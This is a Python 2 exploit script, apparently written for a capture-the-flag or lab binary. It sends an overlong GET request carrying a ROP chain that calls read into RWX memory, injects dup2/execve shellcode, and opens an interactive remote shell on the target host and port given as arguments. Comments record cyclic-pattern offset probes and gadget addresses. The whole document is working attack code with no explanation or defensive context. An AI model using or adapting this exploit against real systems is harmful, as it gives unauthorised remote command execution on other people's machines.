#!/usr/bin/env python

#s.send('A ' + 'A'*1021 + '\n\n')
#s.send('A ' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9B\n\n')
#568

'''
arguments:		rdi, rsi, rdx, rcx, r8, r9, stack right to left
return value:	rax

0x4011dd : pop rdi ; ret
0x4011db : pop rsi ; pop r15 ; ret
0x400cf0 : <read@plt>
'''

import sys, socket, struct, telnetlib, urllib, time

status_info = '[\033[94m*\033[0m]'
status_ok = '[\033[92m+\033[0m]'
status_err = '[\033[91m-\033[0m]'

timeout = 1

def p64u(x):
	return urllib.quote_plus(struct.pack('<Q', x))

if len(sys.argv) == 3:

	ADDR = sys.argv[1]
	PORT = int(sys.argv[2])

	shell = '\x6a\x04\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x79\xf6\x6a\x3b\x58\x48\x31\xf6\x56\x5a\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05'

	rop =  p64u(0x4011dd)			# pop rdi ; ret
	rop += p64u(0x4)				# sockfd
	rop += p64u(0x4011db)			# pop rsi ; pop r15 ; ret
	rop += p64u(0x603270)			# rwx addr
	rop += p64u(0xffffffffffffffff)	# garbage for r15
	rop += p64u(0x400cf0)			# <read@plt>
	rop += p64u(0x603270)			# rwx addr

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(timeout)
	s.connect((ADDR, PORT))

	print status_info + ' Sending first stage'

	s.send('GET ' + 'A'*568 + rop + '\n\n')

	#raw_input('continue')
	time.sleep(0.5)
	s.recv(8192)

	print status_info + ' Sending second stage'

	s.send(shell + '\n')

	#raw_input('continue')
	time.sleep(0.5)

	print status_ok + ' Switching to interactive mode'

	s.send('/bin/bash -i && exit\n')

	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

	s.close()

else:
	print 'Usage: %s <addr> <port>' % sys.argv[0]
